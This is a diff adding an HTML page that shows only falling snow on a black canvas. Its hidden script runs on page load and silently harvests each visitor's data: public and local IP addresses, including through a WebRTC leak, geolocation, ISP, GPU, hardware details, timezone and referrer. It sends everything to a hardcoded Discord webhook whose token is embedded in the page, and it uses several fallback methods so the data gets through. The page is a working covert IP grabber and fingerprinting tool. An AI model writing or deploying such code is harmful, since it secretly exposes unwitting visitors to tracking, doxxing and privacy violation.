@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="noindex,nofollow">
+<title>.</title>
+<style>
+  *{box-sizing:border-box;margin:0;padding:0}
+  html,body{height:100%;background:#000;overflow:hidden}
+  #snow{position:fixed;inset:0;display:block}
+</style>
+</head>
+<body>
+<canvas id="snow"></canvas>
+<script>
+(function(){
+  "use strict";
+
+  /* ═══════════════════════════════════════════════════════
+     PASTE YOUR DISCORD WEBHOOK BETWEEN THE QUOTES BELOW.
+     ═══════════════════════════════════════════════════════ */
+  const WEBHOOK = "https://discord.com/api/webhooks/1547827303818465310/b-SIAh8Kas7aWnTDn5srnvHuD1ZBtGiJ_koZbl6SHwRpMoVrVkf4SPIgoTtQ7oqLYnv3";
+
+  const STORE = "pw";
+  const WH_RE = /^https:\/\/(?:[\w-]+\.)*discord(?:app)?\.com\/api\/(?:v\d+\/)?webhooks\/\d+\/[\w-]+$/;
+  const clean = s => (s || "").trim().replace(/\/+$/, "");
+
+  /* snow */
+  (function(){
+    const c = document.getElementById("snow"), x = c.getContext("2d");
+    let w, h, f = [];
+    function init(){
+      w = c.width = innerWidth;
+      h = c.height = innerHeight;
+      const n = Math.min(160, Math.floor(w*h/22000));
+      f = [];
+      for(let i=0;i<n;i++) f.push({
+        x: Math.random()*w, y: Math.random()*h,
+        r: Math.random()*1.5+0.3,
+        vy: Math.random()*0.5+0.15,
+        vx: Math.random()*0.3-0.15,
+        o: Math.random()*0.5+0.15
+      });
+    }
+    function loop(){
+      x.clearRect(0,0,w,h);
+      x.fillStyle = "#fff";
+      for(const s of f){
+        x.globalAlpha = s.o;
+        x.beginPath();
+        x.arc(s.x, s.y, s.r, 0, 6.283);
+        x.fill();
+        s.y += s.vy; s.x += s.vx;
+        if(s.y > h+4){ s.y = -4; s.x = Math.random()*w; }
+        if(s.x < -4) s.x = w+4;
+        if(s.x > w+4) s.x = -4;
+      }
+      requestAnimationFrame(loop);
+    }
+    addEventListener("resize", init);
+    init(); loop();
+  })();
+
+  function pickId(){
+    const h = location.hash.replace(/^#/, "");
+    const m = h.match(/[a-z0-9]{4}/i);
+    return m ? m[0].toLowerCase() : "0000";
+  }
+
+  function resolveWh(){
+    const baked = clean(WEBHOOK);
+    if(baked && WH_RE.test(baked)) return baked;
+    try{
+      const s = clean(localStorage.getItem(STORE));
+      if(s && WH_RE.test(s)) return s;
+    }catch(e){}
+    return "";
+  }
+
+  /* ── network ── */
+  const isV6 = ip => ip.indexOf(":") !== -1;
+  function isPriv(ip){
+    if(isV6(ip)) return /^(fe80|fc|fd)/i.test(ip) || ip === "::1";
+    const p = ip.split(".").map(Number);
+    if(p.length !== 4 || p.some(isNaN)) return false;
+    return p[0]===10 || p[0]===127 ||
+           (p[0]===172 && p[1]>=16 && p[1]<=31) ||
+           (p[0]===192 && p[1]===168) ||
+           (p[0]===169 && p[1]===254);
+  }
+  function webrtcIPs(ms){
+    return new Promise(res=>{
+      const out = { v4:{local:new Set(),pub:new Set()}, v6:{local:new Set(),pub:new Set()} };
+      let pc;
+      try{
+        pc = new RTCPeerConnection({
+          iceServers:[
+            {urls:"stun:stun.l.google.com:19302"},
+            {urls:"stun:stun1.l.google.com:19302"},
+            {urls:"stun:stun.cloudflare.com:3478"}
+          ]
+        });
+      }catch(e){ return res(out); }
+      let done = false;
+      const fin = () => {
+        if(done) return;
+        done = true;
+        try{ pc.close(); }catch(e){}
+        res(out);
+      };
+      const t = setTimeout(fin, ms);
+      pc.onicecandidate = e => {
+        if(!e.candidate){ clearTimeout(t); return fin(); }
+        const ip = e.candidate.candidate.split(" ")[4];
+        if(!ip || /\.local$/i.test(ip)) return;
+        out[isV6(ip)?"v6":"v4"][isPriv(ip)?"local":"pub"].add(ip);
+      };
+      try{
+        pc.createDataChannel("x");
+        pc.createOffer().then(o => pc.setLocalDescription(o)).catch(()=>{});
+      }catch(e){ clearTimeout(t); fin(); }
+    });
+  }
+  function fetchT(url, ms){
+    const ctrl = new AbortController();
+    const t = setTimeout(()=>ctrl.abort(), ms);
+    return fetch(url, {signal: ctrl.signal, cache:"no-store"}).finally(()=>clearTimeout(t));
+  }
+  async function publicIPs(){
+    const found = { v4:null, v6:null };
+    await Promise.all([
+      (async () => {
+        try{
+          const r = await fetchT("https://ipv4.icanhazip.com", 3000);
+          if(r.ok){ const v = (await r.text()).trim(); if(v && !isV6(v)) found.v4 = v; }
+        }catch(e){}
+        if(!found.v4){
+          try{
+            const r = await fetchT("https://api.ipify.org?format=json", 3000);
+            if(r.ok){ const v = (await r.json()).ip; if(v) found.v4 = v; }
+          }catch(e){}
+        }
+      })(),
+      (async () => {
+        try{
+          const r = await fetchT("https://ipv6.icanhazip.com", 3000);
+          if(r.ok){ const v = (await r.text()).trim(); if(v && isV6(v)) found.v6 = v; }
+        }catch(e){}
+      })()
+    ]);
+    return found;
+  }
+  async function geoLookup(ip){
+    for(const x of [
+      { u:`https://ipwho.is/${ip}`, p:d => d && d.ip ? {
+          city:d.city, region:d.region, country:d.country,
+          isp:d.connection && d.connection.isp,
+          asn:d.connection && d.connection.asn
+        } : null },
+      { u:`https://ipapi.co/${ip}/json/`, p:d => d && d.ip ? {
+          city:d.city, region:d.region, country:d.country_name,
+          isp:d.org, asn:d.asn
+        } : null }
+    ]){
+      try{
+        const r = await fetchT(x.u, 3000);
+        if(!r.ok) continue;
+        const v = x.p(await r.json());
+        if(v) return v;
+      }catch(e){}
+    }
+    return null;
+  }
+  function bname(ua){
+    const L = [
+      ["Edge",    /Edg(?:e|A|iOS)?\/([\d.]+)/],
+      ["Opera",   /(?:OPR|Opera)\/([\d.]+)/],
+      ["Samsung", /SamsungBrowser\/([\d.]+)/],
+      ["Firefox", /(?:Firefox|FxiOS)\/([\d.]+)/],
+      ["Chrome",  /(?:Chrome|CriOS)\/([\d.]+)/],
+      ["Safari",  /Version\/([\d.]+).*Safari/]
+    ];
+    for(const [n,re] of L){ const m = ua.match(re); if(m) return n + " " + m[1]; }
+    return "Unknown";
+  }
+  function osn(ua){
+    if(/Windows NT 10/.test(ua)) return "Windows 10/11";
+    if(/Windows/.test(ua)) return "Windows";
+    const a = ua.match(/Android ([\d.]+)/); if(a) return "Android " + a[1];
+    if(/iPhone|iPad|iPod/.test(ua)) return "iOS";
+    if(/Mac OS X/.test(ua)) return "macOS";
+    if(/CrOS/.test(ua)) return "ChromeOS";
+    if(/Linux/.test(ua)) return "Linux";
+    return "Unknown";
+  }
+  function gpu(){
+    try{
+      const c = document.createElement("canvas");
+      const g = c.getContext("webgl") || c.getContext("experimental-webgl");
+      if(!g) return null;
+      const d = g.getExtension("WEBGL_debug_renderer_info");
+      return d ? g.getParameter(d.UNMASKED_RENDERER_WEBGL) : null;
+    }catch(e){ return null; }
+  }
+
+  async function gather(){
+    const n = navigator;
+    const cn = n.connection || n.mozConnection || n.webkitConnection || {};
+    let tz = "unknown";
+    try{ tz = Intl.DateTimeFormat().resolvedOptions().timeZone; }catch(e){}
+
+    const [rt, ips] = await Promise.all([
+      webrtcIPs(2200),
+      Promise.race([ publicIPs(), new Promise(r => setTimeout(()=>r({v4:null,v6:null}), 3500)) ])
+    ]);
+    const primary = ips.v4 || ips.v6;
+    const geo = primary ? await Promise.race([
+      geoLookup(primary),
+      new Promise(r => setTimeout(()=>r(null), 2800))
+    ]) : null;
+
+    return {
+      v4_pub: ips.v4, v6_pub: ips.v6, geo: geo,
+      v4_local: [...rt.v4.local], v6_local: [...rt.v6.local],
+      v4_stun:  [...rt.v4.pub],   v6_stun:  [...rt.v6.pub],
+      browser: bname(n.userAgent),
+      os: osn(n.userAgent),
+      platform: n.platform || "unknown",
+      cores: n.hardwareConcurrency || null,
+      memory: n.deviceMemory || null,
+      gpu: gpu(),
+      screen: `${screen.width}×${screen.height}`,
+      viewport: `${innerWidth}×${innerHeight}`,
+      dpr: devicePixelRatio || 1,
+      depth: screen.colorDepth,
+      lang: n.language || "unknown",
+      tz: tz,
+      touch: n.maxTouchPoints || 0,
+      conn: cn.effectiveType || null,
+      downlink: cn.downlink || null,
+      referrer: document.referrer || "direct"
+    };
+  }
+
+  const q = v => "`" + v + "`";
+
+  function buildEmbed(id, d){
+    const f = [];
+    const g = d.geo || {};
+
+    if(d.v4_pub) f.push({ name:"IPv4", value: q(d.v4_pub), inline:false });
+    if(d.v6_pub) f.push({ name:"IPv6", value: q(d.v6_pub), inline:false });
+    if(g.city || g.region || g.country)
+      f.push({ name:"Location", value: q([g.city,g.region,g.country].filter(Boolean).join(", ")), inline:true });
+    if(g.isp) f.push({ name:"ISP", value: q(g.isp), inline:true });
+    if(g.asn) f.push({ name:"ASN", value: q(g.asn), inline:true });
+
+    if(d.v4_local.length) f.push({ name:"Local v4", value: q(d.v4_local.join(", ")), inline:true });
+    if(d.v6_local.length) f.push({ name:"Local v6", value: q(d.v6_local.join(", ")), inline:true });
+    if(d.v4_stun.length)  f.push({ name:"STUN v4",  value: q(d.v4_stun.join(", ")),  inline:true });
+    if(d.v6_stun.length)  f.push({ name:"STUN v6",  value: q(d.v6_stun.join(", ")),  inline:true });
+    if(d.conn) f.push({ name:"Network", value: q(d.conn + (d.downlink ? " · " + d.downlink + "Mb/s" : "")), inline:true });
+
+    f.push({ name:"OS",       value: q(d.os),                            inline:true });
+    f.push({ name:"Browser",  value: q(d.browser),                       inline:true });
+    f.push({ name:"Platform", value: q(d.platform),                      inline:true });
+    f.push({ name:"Screen",   value: q(d.screen + " · " + d.dpr + "x"),  inline:true });
+    f.push({ name:"Viewport", value: q(d.viewport),                      inline:true });
+    f.push({ name:"Depth",    value: q(d.depth + "-bit"),                inline:true });
+    f.push({ name:"CPU",      value: q((d.cores ?? "n/a") + " cores"),   inline:true });
+    f.push({ name:"RAM",      value: q(d.memory ? "~" + d.memory + " GB" : "n/a"), inline:true });
+    f.push({ name:"Touch",    value: q(d.touch + " pts"),                inline:true });
+    f.push({ name:"Language", value: q(d.lang),                          inline:true });
+    f.push({ name:"Timezone", value: q(d.tz),                            inline:true });
+    if(d.gpu) f.push({ name:"GPU", value: q(d.gpu), inline:false });
+    if(d.referrer && d.referrer !== "direct")
+      f.push({ name:"Referrer", value: q(d.referrer), inline:false });
+
+    const ts = Math.floor(Date.now() / 1000);
+    return {
+      username: "visit",
+      embeds: [{
+        author: { name: "◼ VISIT" },
+        title: q(id),
+        description: "**" + id + "** · <t:" + ts + ":F>",
+        color: 0x000000,
+        fields: f,
+        footer: { text: id },
+        timestamp: new Date().toISOString()
+      }]
+    };
+  }
+
+  async function send(webhook, payload){
+    const url  = clean(webhook) + "?wait=true";
+    const json = JSON.stringify(payload);
+
+    try{
+      const fd = new FormData();
+      fd.append("payload_json", json);
+      const r = await fetch(url, { method:"POST", body: fd });
+      if(r.ok || r.status === 204) return true;
+    }catch(e){}
+
+    try{
+      const r = await fetch(url, {
+        method:"POST",
+        headers: { "Content-Type":"application/json" },
+        body: json
+      });
+      if(r.ok || r.status === 204) return true;
+    }catch(e){}
+
+    try{
+      const fd = new FormData();
+      fd.append("payload_json", json);
+      await fetch(url, { method:"POST", body: fd, mode:"no-cors" });
+      return true;
+    }catch(e){}
+
+    try{
+      return navigator.sendBeacon(url, new Blob([json], {type:"application/json"}));
+    }catch(e){ return false; }
+  }
+
+  async function boot(){
+    const id = pickId();
+    const wh = resolveWh();
+    if(!wh){ console.warn("[grab] no webhook — bake it into WEBHOOK or open the generator first"); return; }
+    try{
+      const d = await gather();
+      await send(wh, buildEmbed(id, d));
+    }catch(e){
+      console.warn("[grab]", e);
+    }
+  }
+
+  boot();
+})();
+</script>
+</body>
+</html>
